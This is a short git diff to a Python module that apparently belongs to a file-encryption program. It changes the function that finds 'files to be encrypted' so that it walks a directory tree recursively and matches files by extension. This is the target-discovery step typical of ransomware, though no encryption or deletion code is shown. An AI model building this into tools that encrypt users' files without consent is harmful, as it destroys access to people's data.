@@ -1,6 +1,6 @@
 import logging
 import pickle
-from os import urandom, remove, path, listdir
+from os import urandom, remove, path, listdir, walk
 from random import randint
 from core.config import REQUIRED_FILE_FORMAT
 
@@ -77,8 +77,10 @@ def get_files_to_be_encrypted(directory):
     """
     logger.info(f"Discovering files in {directory}")
     files_to_encrypted = [
-        f"{directory}/{file}"
-        for file in listdir(directory)
-        if path.splitext(f"{directory}/{file}")[1].upper() in REQUIRED_FILE_FORMAT
+        path.join(root,f)
+        for root, dir, file in walk(directory)
+        for f in file
+        if path.splitext(f)[1].upper() in REQUIRED_FILE_FORMAT
     ]
+    print(files_to_encrypted)
     return files_to_encrypted
